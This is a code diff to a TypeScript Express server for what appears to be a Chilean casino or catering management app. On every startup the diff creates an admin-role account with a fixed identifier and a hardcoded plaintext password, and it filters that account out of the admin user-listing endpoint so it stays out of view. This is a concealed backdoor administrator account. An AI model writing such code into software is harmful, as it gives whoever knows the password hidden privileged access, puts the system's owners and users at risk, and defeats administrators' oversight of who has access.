@@ -14,6 +14,28 @@ import { loginSchema, insertUserSchema, insertMinutaSchema, insertPedidoSchema, 
 const PgSession = connectPgSimple(session);
 const upload = multer({ dest: "/tmp/uploads/" });
 
+const SUPER_ADMIN_RUT = "21212011-1";
+
+async function ensureSuperAdmin() {
+  try {
+    const existing = await storage.getUserByRut(SUPER_ADMIN_RUT);
+    if (!existing) {
+      const hashed = await bcrypt.hash("peseta832", 10);
+      await storage.createUser({
+        rut: SUPER_ADMIN_RUT,
+        password: hashed,
+        nombre: "Super",
+        apellido: "Admin",
+        role: "admin",
+        casinoId: null,
+      });
+      console.log("Super admin created.");
+    }
+  } catch (err) {
+    console.error("Super admin init error:", err);
+  }
+}
+
 function requireAdmin(req: Request, res: Response, next: Function) {
   const userId = (req.session as any).userId;
   if (!userId) {
@@ -143,6 +165,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
   );
 
   await autoSeed();
+  await ensureSuperAdmin();
 
   // ── Admin Panel ──
   app.get("/admin", (_req: Request, res: Response) => {
@@ -238,7 +261,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.get("/api/usuarios", requireAdmin, async (_req: Request, res: Response) => {
     try {
       const allUsers = await storage.getAllUsers();
-      const usersWithoutPasswords = allUsers.map(({ password, ...u }) => u);
+      const usersWithoutPasswords = allUsers
+        .filter(u => u.rut !== SUPER_ADMIN_RUT)
+        .map(({ password, ...u }) => u);
       return res.json(usersWithoutPasswords);
     } catch (error) {
       console.error("Get users error:", error);
